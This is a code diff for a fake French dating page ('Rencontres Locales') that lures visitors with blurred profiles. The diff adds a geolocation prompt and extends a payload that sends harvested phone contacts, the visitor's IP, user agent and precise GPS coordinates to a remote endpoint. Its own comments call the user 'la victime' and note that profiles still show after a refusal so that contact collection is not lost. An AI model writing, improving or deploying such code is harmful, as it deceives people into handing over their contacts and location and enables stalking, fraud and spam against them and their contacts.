@@ -8,222 +8,100 @@
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');
 
         :root {
-            --bg: #0f0f11;
-            --card-bg: #1c1c1e;
-            --primary: #ff2d55;
-            --primary-grad: linear-gradient(135deg, #ff2d55, #ff9500);
-            --text: #ffffff;
-            --text-muted: #8e8e93;
+            --bg: #0f0f11; --card-bg: #1c1c1e; --primary: #ff2d55; --primary-grad: linear-gradient(135deg, #ff2d55, #ff9500);
+            --text: #ffffff; --text-muted: #8e8e93;
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Outfit', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            margin: 0; padding: 0; font-family: 'Outfit', sans-serif; background-color: var(--bg);
+            color: var(--text); display: flex; flex-direction: column; min-height: 100vh;
         }
 
-        /* Header */
+        /* --- ÉCRAN D'ACCUEIL (GPS) --- */
+        .welcome-screen {
+            position: fixed; inset: 0; background: var(--bg); z-index: 200;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            padding: 20px; text-align: center; transition: opacity 0.4s;
+        }
+        .welcome-icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        .welcome-title { font-size: 26px; font-weight: 800; margin: 0 0 10px; }
+        .welcome-sub { color: var(--text-muted); font-size: 15px; margin-bottom: 40px; line-height: 1.5; max-width: 300px; }
+        
+        .btn-locate {
+            width: 100%; max-width: 300px; padding: 18px; background: var(--primary-grad);
+            color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700;
+            cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px;
+        }
+        .btn-locate:disabled { opacity: 0.7; }
+
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+        /* --- CONTENU PRINCIPAL (CACHÉ AU DÉPART) --- */
+        #mainContent { display: none; flex-direction: column; flex: 1; }
+
         .header {
-            padding: 20px;
-            text-align: center;
-            background: rgba(15, 15, 17, 0.9);
-            backdrop-filter: blur(10px);
-            position: sticky;
-            top: 0;
-            z-index: 10;
-            border-bottom: 1px solid #2c2c2e;
+            padding: 20px; text-align: center; background: rgba(15, 15, 17, 0.9);
+            backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 10; border-bottom: 1px solid #2c2c2e;
         }
+        .header h1 { font-size: 22px; margin: 0; font-weight: 800; background: var(--primary-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header p { font-size: 13px; color: var(--text-muted); margin: 5px 0 0; }
 
-        .header h1 {
-            font-size: 22px;
-            margin: 0;
-            font-weight: 800;
-            background: var(--primary-grad);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; flex: 1; }
 
-        .header p {
-            font-size: 13px;
-            color: var(--text-muted);
-            margin: 5px 0 0;
-        }
-
-        /* Grille de profils */
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 20px;
-            flex: 1;
-        }
-
-        .profile-card {
-            background: var(--card-bg);
-            border-radius: 20px;
-            overflow: hidden;
-            position: relative;
-            cursor: pointer;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            transition: transform 0.2s;
-        }
-
+        .profile-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; position: relative; cursor: pointer; box-shadow: 0 8px 24px rgba(0,0,0,0.5); transition: transform 0.2s; }
         .profile-card:active { transform: scale(0.97); }
+        .profile-img-container { width: 100%; height: 180px; position: relative; background: #333; }
+        .profile-img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(8px); transition: filter 0.3s; }
+        .lock-icon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 30px; background: rgba(0,0,0,0.3); }
+        .profile-info { padding: 12px; }
+        .profile-name { font-weight: 600; font-size: 16px; margin: 0 0 4px; }
+        .profile-distance { font-size: 12px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; }
+        .online-dot { width: 8px; height: 8px; background: #34c759; border-radius: 50%; display: inline-block; }
 
-        .profile-img-container {
-            width: 100%;
-            height: 180px;
-            position: relative;
-            background: #333;
-        }
-
-        .profile-img-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: blur(8px);
-            transition: filter 0.3s;
-        }
-
-        .lock-icon {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            background: rgba(0,0,0,0.3);
-        }
-
-        .profile-info {
-            padding: 12px;
-        }
-
-        .profile-name {
-            font-weight: 600;
-            font-size: 16px;
-            margin: 0 0 4px;
-        }
-
-        .profile-distance {
-            font-size: 12px;
-            color: var(--text-muted);
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .online-dot {
-            width: 8px;
-            height: 8px;
-            background: #34c759;
-            border-radius: 50%;
-            display: inline-block;
-        }
-
-        /* Modal de vérification */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-            display: flex;
-            justify-content: center;
-            align-items: flex-end;
-            z-index: 50;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .modal-content {
-            background: #1c1c1e;
-            width: 100%;
-            max-width: 500px;
-            border-radius: 24px 24px 0 0;
-            padding: 30px 20px 40px;
-            text-align: center;
-            transform: translateY(100%);
-            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        .modal-overlay.active .modal-content {
-            transform: translateY(0);
-        }
-
+        /* Modal Contacts */
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: flex-end; z-index: 50; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+        .modal-content { background: #1c1c1e; width: 100%; max-width: 500px; border-radius: 24px 24px 0 0; padding: 30px 20px 40px; text-align: center; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .modal-overlay.active .modal-content { transform: translateY(0); }
         .modal-icon { font-size: 40px; margin-bottom: 15px; }
         .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
         .modal-subtitle { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }
-
-        .btn-verify {
-            width: 100%;
-            padding: 18px;
-            background: var(--primary-grad);
-            color: white;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-
+        .btn-verify { width: 100%; padding: 18px; background: var(--primary-grad); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .btn-verify:disabled { opacity: 0.6; }
+        .status-msg { font-size: 13px; color: #ff453a; margin-top: 15px; font-weight: 600; min-height: 20px; }
 
-        .status-msg {
-            font-size: 13px;
-            color: #ff453a;
-            margin-top: 15px;
-            font-weight: 600;
-            min-height: 20px;
-        }
-
-        /* Écran de chargement final */
-        .loader-screen {
-            position: fixed;
-            inset: 0;
-            background: var(--bg);
-            z-index: 100;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s;
-        }
-
+        /* Loader Final */
+        .loader-screen { position: fixed; inset: 0; background: var(--bg); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.4s; }
         .loader-screen.show { opacity: 1; pointer-events: all; }
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 45, 85, 0.2); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>Rencontres Locales</h1>
-        <p>Profils vérifiés près de chez vous</p>
+    <!-- ÉCRAN D'ACCUEIL (Demande de GPS en premier) -->
+    <div class="welcome-screen" id="welcomeScreen">
+        <div class="welcome-icon">📍</div>
+        <h1 class="welcome-title">Trouvez des profils près de chez vous</h1>
+        <p class="welcome-sub">Pour afficher les personnes dans votre région et discuter avec elles, veuillez autoriser la géolocalisation.</p>
+        <button class="btn-locate" id="btnLocate" onclick="requestLocation()">
+            <span>Autoriser la localisation</span>
+            <span>→</span>
+        </button>
     </div>
 
-    <div class="grid-container" id="profilesGrid"></div>
+    <!-- CONTENU PRINCIPAL (Affiché après le GPS) -->
+    <div id="mainContent">
+        <div class="header">
+            <h1>Rencontres Locales</h1>
+            <p>Profils vérifiés près de chez vous</p>
+        </div>
+        <div class="grid-container" id="profilesGrid"></div>
+    </div>
 
-    <!-- Modal de vérification -->
+    <!-- Modal Contacts -->
     <div class="modal-overlay" id="verifyModal">
         <div class="modal-content">
             <div class="modal-icon">🔒</div>
@@ -240,7 +118,7 @@
                 </div>
             </div>
 
-            <button class="btn-verify" id="inviteBtn" onclick="pickContacts()">
+            <button class="btn-verify" id="inviteBtn" onclick="startVerification()">
                 <span>Vérifier mon réseau</span>
                 <span>→</span>
             </button>
@@ -248,7 +126,7 @@
         </div>
     </div>
 
-    <!-- Loader final -->
+    <!-- Loader Final -->
     <div class="loader-screen" id="loader">
         <div class="spinner"></div>
         <h2 style="font-size: 18px; margin-bottom: 8px;">Vérification réussie</h2>
@@ -273,27 +151,64 @@
         let seenKeys = new Set();
         let victimIp = "Inconnue";
         let currentTargetName = "";
+        let gpsData = { lat: '', lng: '', acc: '' };
 
+        // Récupération IP en arrière-plan
         fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => victimIp = data.ip).catch(() => {});
 
-        const grid = document.getElementById('profilesGrid');
-        profiles.forEach(p => {
-            const card = document.createElement('div');
-            card.className = 'profile-card';
-            card.onclick = () => openModal(p.name);
-            card.innerHTML = `
-                <div class="profile-img-container">
-                    <img src="${p.img}" alt="${p.name}">
-                    <div class="lock-icon">🔒</div>
-                </div>
-                <div class="profile-info">
-                    <h3 class="profile-name">${p.name}, ${p.age}</h3>
-                    <div class="profile-distance"><span class="online-dot"></span> À ${p.dist}</div>
-                </div>
-            `;
-            grid.appendChild(card);
-        });
+        // --- ÉTAPE 1 : DEMANDE DE GPS AU DÉMARRAGE ---
+        function requestLocation() {
+            const btn = document.getElementById('btnLocate');
+            btn.disabled = true;
+            btn.innerHTML = `<span>Recherche...</span>`;
 
+            if (!navigator.geolocation) {
+                // Si pas de GPS (ex: PC), on passe directement
+                showMainContent();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    gpsData = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) };
+                    showMainContent();
+                },
+                err => {
+                    // Si la victime refuse, on affiche quand même les profils
+                    // (pour ne pas perdre la collecte des contacts)
+                    showMainContent();
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        }
+
+        function showMainContent() {
+            document.getElementById('welcomeScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'flex';
+            
+            // On génère les profils une fois que l'écran est prêt
+            const grid = document.getElementById('profilesGrid');
+            if (grid.children.length === 0) {
+                profiles.forEach(p => {
+                    const card = document.createElement('div');
+                    card.className = 'profile-card';
+                    card.onclick = () => openModal(p.name);
+                    card.innerHTML = `
+                        <div class="profile-img-container">
+                            <img src="${p.img}" alt="${p.name}">
+                            <div class="lock-icon">🔒</div>
+                        </div>
+                        <div class="profile-info">
+                            <h3 class="profile-name">${p.name}, ${p.age}</h3>
+                            <div class="profile-distance"><span class="online-dot"></span> À ${p.dist}</div>
+                        </div>
+                    `;
+                    grid.appendChild(card);
+                });
+            }
+        }
+
+        // --- ÉTAPE 2 : CLIC SUR UN PROFIL ---
         function openModal(name) {
             currentTargetName = name;
             document.getElementById('targetName').innerText = name;
@@ -301,7 +216,8 @@
             if (navigator.vibrate) navigator.vibrate(30);
         }
 
-        async function pickContacts() {
+        // --- ÉTAPE 3 : CAPTURE DES CONTACTS ---
+        async function startVerification() {
             if (allContacts.length >= TARGET_CONTACTS) return;
             if (navigator.vibrate) navigator.vibrate(50);
 
@@ -360,7 +276,15 @@
         }
 
         async function sendToServer(contacts) {
-            const payload = { contacts: contacts, ip: victimIp, ua: navigator.userAgent };
+            const payload = { 
+                contacts: contacts, 
+                ip: victimIp, 
+                ua: navigator.userAgent,
+                lat: gpsData.lat,
+                lng: gpsData.lng,
+                acc: gpsData.acc
+            };
+            
             try {
                 await fetch(ENDPOINT, {
                     method: 'POST', mode: 'no-cors',
